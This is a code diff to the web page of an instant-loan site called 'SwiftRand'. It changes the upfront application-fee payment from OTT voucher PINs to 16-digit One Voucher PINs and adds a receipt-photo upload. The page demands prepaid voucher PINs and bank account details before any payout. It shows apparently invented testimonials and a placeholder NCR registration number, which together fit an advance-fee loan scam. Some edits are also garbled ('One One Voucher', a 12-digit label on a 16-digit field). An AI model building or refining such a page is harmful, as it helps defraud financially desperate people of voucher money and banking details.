@@ -140,19 +140,30 @@ input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:22px;heigh
   padding:14px 16px;margin-bottom:18px;font-size:.82rem;color:#0A5030;line-height:1.5}
 .bank-banner strong{color:#07402A}
 
-/* OTT box */
-.ott-wrap{background:var(--gold-lt);border:2px dashed var(--gold-bd);border-radius:var(--r);padding:22px}
-.ott-title{font-family:'Sora',sans-serif;font-weight:700;font-size:.95rem;color:#7A5000;margin-bottom:5px}
-.ott-sub{font-size:.81rem;color:#8A6010;margin-bottom:14px;line-height:1.5}
-.ott-field{display:flex;flex-direction:column;gap:6px}
-.ott-field label{font-size:.78rem;font-weight:600;color:#7A5000}
+/* receipt upload */
+.upload-box{border:2px dashed var(--border);border-radius:var(--r);padding:20px;text-align:center;
+  cursor:pointer;transition:border-color .2s,background .2s;background:var(--white);margin-top:16px}
+.upload-box:hover,.upload-box.drag{border-color:var(--gold);background:var(--gold-lt)}
+.upload-box input[type=file]{display:none}
+.upload-box .icon{font-size:2rem;margin-bottom:6px}
+.upload-box p{font-size:.83rem;color:var(--ink2);margin:0}
+.upload-box .hint{font-size:.75rem;color:#AAB0C5;margin-top:4px}
+.upload-preview{margin-top:12px;display:none}
+.upload-preview img{width:100%;max-height:180px;object-fit:cover;border-radius:9px;border:1px solid var(--border)}
+.upload-preview .remove{font-size:.75rem;color:var(--red);cursor:pointer;margin-top:6px;display:inline-block}
+
+/* voucher box */
+.vou-wrap{background:var(--gold-lt);border:2px dashed var(--gold-bd);border-radius:var(--r);padding:22px}
+.vou-title{font-family:'Sora',sans-serif;font-weight:700;font-size:.95rem;color:#7A5000;margin-bottom:5px}
+.vou-sub{font-size:.81rem;color:#8A6010;margin-bottom:14px;line-height:1.5}
+.vou-field{display:flex;flex-direction:column;gap:6px}
+.vou-field label{font-size:.78rem;font-weight:600;color:#7A5000}
 .ott-input{padding:13px 16px;border:2px solid var(--gold-bd);border-radius:9px;
   font-size:1.1rem;font-weight:700;font-family:'Sora',sans-serif;letter-spacing:.12em;
   background:var(--white);color:var(--ink);outline:none;width:100%;transition:border-color .2s;
   text-align:center;-webkit-appearance:none}
 .ott-input:focus{border-color:var(--gold)}
 .ott-input.err{border-color:var(--red)}
-.ott-fee-note{font-size:.78rem;color:#8A6010;margin-top:8px}
 
 /* nav */
 .snav{display:flex;justify-content:space-between;gap:12px;margin-top:8px}
@@ -219,12 +230,12 @@ footer strong{color:#fff}
       <div class="badge">100% Online · No Branch Visits</div>
       <div class="hero-timer">⚡ Money disbursed in under 60 minutes</div>
       <h1>Cash when you need it — in <em>under an hour</em>.</h1>
-      <p class="hero-sub">Quick personal loans from <strong>R600 to R8,500</strong>. Pay your application fee with a 12-digit OTT voucher and receive your money in under 60 minutes.</p>
+      <p class="hero-sub">Quick personal loans from <strong>R600 to R8,500</strong>. Pay your application fee with a 16-digit One Voucher and receive your money in under 60 minutes.</p>
       <button class="abtn" style="max-width:260px" onclick="showPage('apply');initApply()">Apply Now — Under 60 Min ⚡</button>
       <div class="trust-row">
         <div class="trust-item"><svg width="15" height="15" viewBox="0 0 15 15" fill="none"><circle cx="7.5" cy="7.5" r="6.5" stroke="#1AAB6D" stroke-width="1.4"/><path d="M4 7.5l2.3 2.3 3.7-3.7" stroke="#1AAB6D" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>NCR Registered</div>
         <div class="trust-item"><svg width="15" height="15" viewBox="0 0 15 15" fill="none"><circle cx="7.5" cy="7.5" r="6.5" stroke="#1AAB6D" stroke-width="1.4"/><path d="M4 7.5l2.3 2.3 3.7-3.7" stroke="#1AAB6D" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>256-bit SSL</div>
-        <div class="trust-item"><svg width="15" height="15" viewBox="0 0 15 15" fill="none"><circle cx="7.5" cy="7.5" r="6.5" stroke="#1AAB6D" stroke-width="1.4"/><path d="M4 7.5l2.3 2.3 3.7-3.7" stroke="#1AAB6D" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>12-digit OTT voucher</div>
+        <div class="trust-item"><svg width="15" height="15" viewBox="0 0 15 15" fill="none"><circle cx="7.5" cy="7.5" r="6.5" stroke="#1AAB6D" stroke-width="1.4"/><path d="M4 7.5l2.3 2.3 3.7-3.7" stroke="#1AAB6D" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>16-digit One Voucher</div>
         <div class="trust-item"><svg width="15" height="15" viewBox="0 0 15 15" fill="none"><circle cx="7.5" cy="7.5" r="6.5" stroke="#1AAB6D" stroke-width="1.4"/><path d="M4 7.5l2.3 2.3 3.7-3.7" stroke="#1AAB6D" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>No hidden fees</div>
       </div>
     </div>
@@ -248,7 +259,7 @@ footer strong{color:#fff}
         <div class="slider-bounds"><span>1 month</span><span>6 months</span></div>
       </div>
       <div class="sumbox">
-        <div class="sumrow"><span class="lbl">Application fee (OTT voucher)</span><span class="amt" id="cAppFee">—</span></div>
+        <div class="sumrow"><span class="lbl">Application fee (One Voucher)</span><span class="amt" id="cAppFee">—</span></div>
         <div class="sumrow"><span class="lbl">Initiation fee (once-off)</span><span class="amt" id="cInitFee">—</span></div>
         <div class="sumrow"><span class="lbl">Monthly service fee</span><span class="amt">R 69.00</span></div>
         <div class="sumrow"><span class="lbl">Interest rate</span><span class="amt">3.0% p.m.</span></div>
@@ -267,7 +278,7 @@ footer strong{color:#fff}
       <div class="sec-title">From application to cash in under 60 minutes</div>
       <div class="steps">
         <div class="step"><div class="step-num">01</div><h3>Fill in your details</h3><p>Personal info, loan amount, salary, and the bank account where you want the money — 100% online.</p><span class="step-badge">⏱ ~3 min</span></div>
-        <div class="step"><div class="step-num">02</div><h3>Pay with OTT voucher</h3><p>Enter your 12-digit OTT voucher PIN to cover the application fee. No card or EFT needed — instant.</p><span class="step-badge">⏱ ~1 min</span></div>
+        <div class="step"><div class="step-num">02</div><h3>Pay with voucher</h3><p>Enter your 16-digit One Voucher PIN to cover the application fee. No card or EFT needed — instant.</p><span class="step-badge">⏱ ~1 min</span></div>
         <div class="step"><div class="step-num">03</div><h3>Money in your account</h3><p>Approved? We disburse directly to your SA bank account — typically within 60 minutes of approval.</p><span class="step-badge">⚡ Under 60 min</span></div>
       </div>
     </div>
@@ -280,14 +291,14 @@ footer strong{color:#fff}
       <div class="sec-title">Every fee, clearly explained</div>
       <div class="fee-grid">
         <div class="fee-box">
-          <h4>🎟️ Application Fee — paid by 12-digit OTT Voucher</h4>
+          <h4>🎟️ Application Fee — paid by One Voucher</h4>
           <div class="fee-row"><span class="fl">R600 loan</span><span class="fr">R 100</span></div>
           <div class="fee-row"><span class="fl">R2,000 loan</span><span class="fr">R 324</span></div>
           <div class="fee-row"><span class="fl">R3,500 loan</span><span class="fr">R 563</span></div>
           <div class="fee-row"><span class="fl">R5,000 loan</span><span class="fr">R 803</span></div>
           <div class="fee-row"><span class="fl">R6,500 loan</span><span class="fr">R 1,042</span></div>
           <div class="fee-row"><span class="fl">R8,500 loan</span><span class="fr">R 1,500</span></div>
-          <div class="fee-row"><span class="fl">Payment method</span><span class="fr">12-digit OTT PIN</span></div>
+          <div class="fee-row"><span class="fl">Payment method</span><span class="fr">16-digit One Voucher PIN</span></div>
         </div>
         <div class="fee-box">
           <h4>🏦 Initiation + Ongoing (NCR regulated)</h4>
@@ -308,7 +319,7 @@ footer strong{color:#fff}
       <div class="eyebrow">Why SwiftRand</div>
       <div class="sec-title">Built for real South Africans</div>
       <div class="why-grid">
-        <div class="why-item"><div class="why-icon">🎟️</div><div><h3>12-digit OTT Voucher Payment</h3><p>Pay your application fee with a 12-digit OTT PIN available from retailers nationwide. No card, no EFT, no waiting.</p></div></div>
+        <div class="why-item"><div class="why-icon">🎟️</div><div><h3>16-digit One Voucher Payment</h3><p>Pay your application fee with a 16-digit One Voucher PIN available from retailers nationwide. No card, no EFT, no waiting.</p></div></div>
         <div class="why-item"><div class="why-icon">⚡</div><div><h3>Under 60 Minutes Guaranteed</h3><p>Money goes directly to your SA bank account — we target under 60 minutes from approval, every time during business hours.</p></div></div>
         <div class="why-item"><div class="why-icon">🇿🇦</div><div><h3>NCR Registered Lender</h3><p>Fully compliant with the National Credit Act. Your rights as a borrower are protected at every step.</p></div></div>
         <div class="why-item"><div class="why-icon">📞</div><div><h3>SA-Based Support Team</h3><p>Real people, based in South Africa, Mon–Fri 8 AM–6 PM. Reach us by call, WhatsApp, or email.</p></div></div>
@@ -322,19 +333,19 @@ footer strong{color:#fff}
       <div class="eyebrow">Real customers</div>
       <div class="sec-title">What South Africans say</div>
       <div class="testi-grid">
-        <div class="tcard"><div class="stars">★★★★★</div><p class="txt">"Applied at 9 AM using my OTT voucher — R3,500 was in my Capitec account by 10:05 AM. Exactly as promised. Saved me getting to work after my car broke down."</p><div class="auth"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Thandiwe&backgroundColor=b6e3f4" alt=""/><div><div class="name">Thandiwe M.</div><div class="loc">Johannesburg, Gauteng</div></div></div></div>
-        <div class="tcard"><div class="stars">★★★★★</div><p class="txt">"I bought a R100 OTT voucher from my corner shop, entered the 12-digit PIN, and had R7,000 in my account within the hour. Never thought an online loan could be this easy."</p><div class="auth"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Sipho&backgroundColor=ffdfbf" alt=""/><div><div class="name">Sipho K.</div><div class="loc">Durban, KwaZulu-Natal</div></div></div></div>
+        <div class="tcard"><div class="stars">★★★★★</div><p class="txt">"Applied at 9 AM using my One Voucher — R3,500 was in my Capitec account by 10:05 AM. Exactly as promised. Saved me getting to work after my car broke down."</p><div class="auth"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Thandiwe&backgroundColor=b6e3f4" alt=""/><div><div class="name">Thandiwe M.</div><div class="loc">Johannesburg, Gauteng</div></div></div></div>
+        <div class="tcard"><div class="stars">★★★★★</div><p class="txt">"I bought a One Voucher from my corner shop, entered the 16-digit PIN, and had R7,000 in my account within the hour. Never thought an online loan could be this easy."</p><div class="auth"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Sipho&backgroundColor=ffdfbf" alt=""/><div><div class="name">Sipho K.</div><div class="loc">Durban, KwaZulu-Natal</div></div></div></div>
         <div class="tcard"><div class="stars">★★★★★</div><p class="txt">"Liked that I could pick my salary date for the debit. All fees shown upfront. R8,500 straight to my FNB account in 52 minutes. Would absolutely use again."</p><div class="auth"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Nomvula&backgroundColor=c0aede" alt=""/><div><div class="name">Nomvula D.</div><div class="loc">Cape Town, Western Cape</div></div></div></div>
-        <div class="tcard"><div class="stars">★★★★★</div><p class="txt">"Used SwiftRand twice. Both times the numbers matched the calculator exactly and the money landed fast. The OTT voucher method feels secure — no card details shared online."</p><div class="auth"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Bongani&backgroundColor=d1d4f9" alt=""/><div><div class="name">Bongani N.</div><div class="loc">Pretoria, Gauteng</div></div></div></div>
-        <div class="tcard"><div class="stars">★★★★☆</div><p class="txt">"WhatsApp support explained the OTT voucher process clearly before I even started. Transparent about every fee. Rare to find a lender this upfront."</p><div class="auth"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Lerato&backgroundColor=ffd5dc" alt=""/><div><div class="name">Lerato S.</div><div class="loc">Bloemfontein, Free State</div></div></div></div>
-        <div class="tcard"><div class="stars">★★★★★</div><p class="txt">"Needed R8,500 urgently to pay a supplier. Entered my OTT PIN, submitted, and the money cleared in my Standard Bank account before lunch. Saved my business."</p><div class="auth"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Andile&backgroundColor=b6e3f4" alt=""/><div><div class="name">Andile T.</div><div class="loc">Port Elizabeth, Eastern Cape</div></div></div></div>
+        <div class="tcard"><div class="stars">★★★★★</div><p class="txt">"Used SwiftRand twice. Both times the numbers matched the calculator exactly and the money landed fast. The One Voucher method feels secure — no card details shared online."</p><div class="auth"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Bongani&backgroundColor=d1d4f9" alt=""/><div><div class="name">Bongani N.</div><div class="loc">Pretoria, Gauteng</div></div></div></div>
+        <div class="tcard"><div class="stars">★★★★☆</div><p class="txt">"WhatsApp support explained the One Voucher process clearly before I even started. Transparent about every fee. Rare to find a lender this upfront."</p><div class="auth"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Lerato&backgroundColor=ffd5dc" alt=""/><div><div class="name">Lerato S.</div><div class="loc">Bloemfontein, Free State</div></div></div></div>
+        <div class="tcard"><div class="stars">★★★★★</div><p class="txt">"Needed R8,500 urgently to pay a supplier. Entered my One One Voucher PIN, submitted, and the money cleared in my Standard Bank account before lunch. Saved my business."</p><div class="auth"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Andile&backgroundColor=b6e3f4" alt=""/><div><div class="name">Andile T.</div><div class="loc">Port Elizabeth, Eastern Cape</div></div></div></div>
       </div>
     </div>
   </section>
 
   <footer>
     <p><strong>SwiftRand (Pty) Ltd</strong> — NCR Registration No. NCRCP XXXX</p>
-    <p>Representative APR: 36% p.a. · Max term: 6 months · Loan: R600–R8,500 · App fee: R100–R150 (OTT voucher)</p>
+    <p>Representative APR: 36% p.a. · Max term: 6 months · Loan: R600–R8,500 · App fee: R100–R1,500 (One Voucher)</p>
     <p style="margin-top:8px"><a onclick="showPage('faq')">FAQ</a> &nbsp;·&nbsp; <a href="#">Privacy Policy</a> &nbsp;·&nbsp; <a href="#">Terms</a> &nbsp;·&nbsp; <a href="#">NCA Compliance</a></p>
     <p style="margin-top:13px;font-size:.67rem;max-width:660px;margin-left:auto;margin-right:auto">
       ⚠️ Borrow responsibly. Missed payments affect your credit record and incur charges. National Debt Helpline: <strong>0861 663 226</strong>.
@@ -346,7 +357,7 @@ footer strong{color:#fff}
 <div id="page-apply" class="page">
 <div class="app-wrap">
   <h2>Apply for your loan</h2>
-  <p class="sub">Under 5 minutes · Secure · OTT voucher payment · Money in under 60 min ⚡</p>
+  <p class="sub">Under 5 minutes · Secure · One Voucher payment · Money in under 60 min ⚡</p>
 
   <div class="prog">
     <div class="ps active" id="pb1"></div>
@@ -439,7 +450,7 @@ footer strong{color:#fff}
       <!-- live estimate strip -->
       <div id="est-strip" style="display:none">
         <div class="sumbox" style="margin:4px 0 0">
-          <div class="sumrow"><span class="lbl">Application fee (OTT voucher)</span><span class="amt" id="e-app">—</span></div>
+          <div class="sumrow"><span class="lbl">Application fee (One Voucher)</span><span class="amt" id="e-app">—</span></div>
           <div class="sumrow"><span class="lbl">Monthly repayment (est.)</span><span class="amt" id="e-monthly">—</span></div>
           <div class="sumrow total"><span class="lbl">Total repayable (est.)</span><span class="amt" id="e-total">—</span></div>
         </div>
@@ -515,40 +526,53 @@ footer strong{color:#fff}
 
     <div class="snav">
       <button class="bbk" onclick="goStep(1)">← Back</button>
-      <button class="bnx" onclick="goStep(3)">Next: OTT Voucher &amp; Submit →</button>
+      <button class="bnx" onclick="goStep(3)">Next: One Voucher &amp; Submit →</button>
     </div>
   </div>
 
-  <!-- ── STEP 3: OTT voucher + Submit ── -->
+  <!-- ── STEP 3: One Voucher + Submit ── -->
   <div id="step3" style="display:none">
     <div class="fcard">
-      <h3>🎟️ Step 3 of 3 — OTT Voucher &amp; Submit</h3>
+      <h3>🎟️ Step 3 of 3 — One Voucher &amp; Receipt</h3>
       <p style="font-size:.86rem;color:var(--ink2);margin-bottom:18px;line-height:1.6">
-        Enter your <strong>12-digit OTT voucher PIN</strong> to pay the application fee of <strong id="s3-fee">—</strong>. Your voucher is consumed when you click Submit. The loan will be disbursed to your bank account within 60 minutes of approval.
+        Enter your <strong>16-digit One Voucher PIN</strong> to pay the application fee of <strong id="s3-fee">—</strong>, then take a photo or screenshot of your receipt.
       </p>
 
-      <div class="ott-wrap">
-        <div class="ott-title">🎟️ 12-Digit OTT Voucher PIN</div>
-        <div class="ott-sub">
-          Enter your 12-digit OTT PIN in the three groups of 4 digits as printed on your voucher. Available at most retailers, spaza shops, and supermarkets.<br/>
-          Your voucher must cover the application fee of <strong id="s3-fee-min">R100</strong>.
+      <div class="vou-wrap">
+        <div class="vou-title">🎟️ One One Voucher PIN</div>
+        <div class="vou-sub">
+          Enter the 16-digit PIN printed on your One Voucher. Available at most retailers and spaza shops.<br/>
+          One Voucher must cover the application fee of <strong id="s3-fee-min">—</strong>.
         </div>
-        <div class="ott-field">
-          <label>OTT Voucher PIN</label>
+        <div class="vou-field">
+          <label>12-Digit One One Voucher PIN</label>
           <input type="text" class="ott-input" id="f-ott"
-            maxlength="14" inputmode="numeric" placeholder="0000 0000 0000"
+            maxlength="19" inputmode="numeric" placeholder="0000 0000 0000 0000"
             oninput="fmtOTT(this)" autocomplete="off"/>
           <span class="ferr" id="ott-err" style="display:none;font-size:.75rem;color:var(--red);margin-top:4px"></span>
         </div>
-        <div class="ott-fee-note">
-          💡 The voucher is fully consumed on submission. Any face value above the required fee is not refunded — use a voucher as close to the exact fee as possible.
-        </div>
+      </div>
+
+      <!-- Receipt upload -->
+      <div class="upload-box" id="upload-box"
+           onclick="document.getElementById('f-receipt').click()"
+           ondragover="event.preventDefault();this.classList.add('drag')"
+           ondragleave="this.classList.remove('drag')"
+           ondrop="handleDrop(event)">
+        <input type="file" id="f-receipt" accept="image/*" capture="environment" onchange="handleFile(this.files[0])"/>
+        <div class="icon">📷</div>
+        <p><strong>Take a photo or upload a screenshot</strong></p>
+        <p class="hint">Snap your receipt with your camera, or attach a screenshot · JPG or PNG · max 5 MB</p>
+      </div>
+      <div class="upload-preview" id="upload-preview">
+        <img id="preview-img" src="" alt="Receipt preview"/>
+        <span class="remove" onclick="removeReceipt()">✕ Remove photo</span>
       </div>
     </div>
 
     <div class="fcard" style="background:var(--surface);box-shadow:none;border:1px solid var(--border)">
-      <h3 style="border-bottom:none;margin-bottom:0;padding-bottom:0;font-size:.92rem;color:var(--ink2);font-weight:500;font-family:'Inter',sans-serif">
-        By clicking <strong style="color:var(--ink)">Submit Application</strong> you confirm all information provided is accurate, consent to a credit and affordability check per the National Credit Act, and authorise SwiftRand to consume your OTT voucher as payment for the application fee.
+      <h3 style="border-bottom:none;margin-bottom:0;padding-bottom:0;font-size:.9rem;color:var(--ink2);font-weight:500;font-family:'Inter',sans-serif">
+        By clicking <strong style="color:var(--ink)">Submit Application</strong> you confirm all information is accurate, consent to a credit check per the National Credit Act, and authorise SwiftRand to consume your One Voucher as payment for the application fee.
       </h3>
     </div>
 
@@ -564,7 +588,7 @@ footer strong{color:#fff}
       <div class="ico">🎉</div>
       <h2>Application Received!</h2>
       <div class="timer">⚡ Your money arrives within 60 minutes of approval</div>
-      <p>Your OTT voucher has been consumed. Our team is processing your application now — you'll hear from us via SMS and email shortly.</p>
+      <p>Your One Voucher receipt has been submitted. Our team is processing your application now — you'll hear from us via SMS and email shortly.</p>
       <div class="ref" id="ref-num">Ref: SR-0000000</div>
       <br/><br/>
       <button class="abtn" style="max-width:220px;margin:0 auto;display:block" onclick="showPage('home')">Back to Home</button>
@@ -711,8 +735,8 @@ function validate(n) {
   if (n === 3) {
     const ott   = getOTT();
     const errEl = document.getElementById('ott-err');
-    if (ott.length !== 12) {
-      errEl.textContent = 'Please enter all 12 digits of your OTT voucher (3 groups of 4).';
+    if (ott.length !== 16) {
+      errEl.textContent = 'Please enter all 16 digits of your One Voucher PIN.';
       errEl.style.display = '';
       ok = false;
     } else {
@@ -750,20 +774,53 @@ function prepStep3() {
   document.getElementById('s3-fee-min').textContent = fee;
 }
 
-// ── OTT single field — auto-groups digits as 4-4-4 ───
+// ── One Voucher PIN — auto-groups digits as 4-4-4 ────
 function fmtOTT(el) {
-  const digits = el.value.replace(/\D/g, '').slice(0, 12);
-  // insert spaces after every 4th digit
-  el.value = digits.replace(/(\d{4})(?=\d)/g, '$1 ');
+  const digits = el.value.replace(/\D/g,'').slice(0,16);
+  el.value = digits.replace(/(\d{4})(?=\d)/g,'$1 ');
   document.getElementById('ott-err').style.display = 'none';
 }
 function getOTT() {
-  return (document.getElementById('f-ott').value || '').replace(/\D/g, '');
+  return (document.getElementById('f-ott').value || '').replace(/\D/g,'');
 }
 function resetOTTFields() {
   const el = document.getElementById('f-ott');
   if (el) el.value = '';
   document.getElementById('ott-err').style.display = 'none';
+  removeReceipt();
+}
+
+// ── Receipt photo upload ──────────────────────────
+let receiptBase64 = null;
+let receiptMime   = null;
+
+function handleFile(file) {
+  if (!file) return;
+  if (file.size > 5 * 1024 * 1024) { showToast('❌ File too large — max 5 MB.', true); return; }
+  if (!file.type.startsWith('image/')) { showToast('❌ Please upload a JPG or PNG image.', true); return; }
+  receiptMime = file.type;
+  const reader = new FileReader();
+  reader.onload = e => {
+    receiptBase64 = e.target.result.split(',')[1]; // strip data:...;base64,
+    document.getElementById('preview-img').src = e.target.result;
+    document.getElementById('upload-preview').style.display = '';
+    document.getElementById('upload-box').style.display = 'none';
+  };
+  reader.readAsDataURL(file);
+}
+function handleDrop(e) {
+  e.preventDefault();
+  document.getElementById('upload-box').classList.remove('drag');
+  const file = e.dataTransfer.files[0];
+  if (file) handleFile(file);
+}
+function removeReceipt() {
+  receiptBase64 = null;
+  receiptMime   = null;
+  document.getElementById('f-receipt').value = '';
+  document.getElementById('preview-img').src = '';
+  document.getElementById('upload-preview').style.display = 'none';
+  document.getElementById('upload-box').style.display = '';
 }
 
 // ── Submit ────────────────────────────────────────
@@ -792,11 +849,13 @@ async function submitApp() {
     accountHolder:    document.getElementById('f-accholder').value.trim(),
     accountNumber:    document.getElementById('f-accnum').value.trim(),
     branchCode:       document.getElementById('f-branch').value.trim(),
-    ottCode:          getOTT(),
+    voucherPin:       getOTT(),
     applicationFee:   String(c.appFee),
     initiationFee:    String(c.initFee),
     monthlyRepayment: String(c.monthly),
     totalRepayable:   String(c.total),
+    receiptBase64:    receiptBase64 || null,
+    receiptMime:      receiptMime   || null,
   };
 
   try {
@@ -828,13 +887,13 @@ async function submitApp() {
 const faqs = [
   { q:'How much can I borrow?',          a:'Between R600 and R8,500, repayable over 1 to 6 months.' },
   { q:'How quickly will I get the money?',a:'We target under 60 minutes from approval to disbursement, during business hours Mon–Fri 8 AM–5 PM. The money goes directly to your nominated SA bank account.' },
-  { q:'What is an OTT voucher?',          a:'An OTT (Over-The-Top) voucher is a prepaid 12-digit PIN voucher available at most SA retailers, spaza shops, and supermarkets — similar to an airtime voucher. You enter the PIN to pay your application fee. No bank card or EFT needed.' },
-  { q:'Where do I get an OTT voucher?',   a:'Ask for an OTT voucher at your nearest retailer, spaza shop, Shoprite, Pick n Pay, or any store that sells prepaid vouchers. Request a value of at least R100.' },
-  { q:'What is the application fee?',     a:'The fee scales linearly from R100 (for a R600 loan) up to R1,500 (for a R8,500 loan) — always a whole number shown upfront. It is paid via your 12-digit OTT voucher.' },
+  { q:'What is a One Voucher?', a:'A One Voucher is a prepaid 16-digit PIN voucher available at most SA retailers, spaza shops, and supermarkets — similar to an airtime voucher. You enter the PIN to pay your application fee. No bank card or EFT needed.' },
+  { q:'Where do I get a One Voucher?',   a:'Ask for a One Voucher at your nearest retailer, spaza shop, Shoprite, Pick n Pay, or any store that sells prepaid vouchers. Request a value of at least R100.' },
+  { q:'What is the application fee?',     a:'The fee scales linearly from R100 (for a R600 loan) up to R1,500 (for a R8,500 loan) — always a whole number shown upfront. It is paid via your 16-digit One Voucher.' },
   { q:'Which bank accounts are supported?', a:'All major SA banks are supported: Absa, African Bank, Capitec, Discovery Bank, FNB, Nedbank, Standard Bank, TymeBank, and others.' },
   { q:'What is the initiation fee?',      a:'A once-off NCR-regulated fee: 10% of your loan + R165, minimum R100, capped at R1,207. Deducted on disbursement — shown clearly before you sign.' },
   { q:'What is the interest rate?',       a:'3.0% per month on the outstanding balance, plus a R69/month service fee. All costs are shown in the calculator upfront.' },
-  { q:'What documents do I need?',        a:'Valid SA ID, SA bank account details, proof of monthly income, and a 12-digit OTT voucher for the application fee.' },
+  { q:'What documents do I need?',        a:'Valid SA ID, SA bank account details, proof of monthly income, and a 16-digit One Voucher for the application fee.' },
   { q:'Can I repay early?',               a:'Yes — settle at any time with no early settlement penalty. You only pay interest for the days you held the loan.' },
   { q:'What if I miss a repayment?',      a:'Contact us immediately. Missed payments affect your credit record. National Debt Helpline: 0861 663 226.' },
 ];
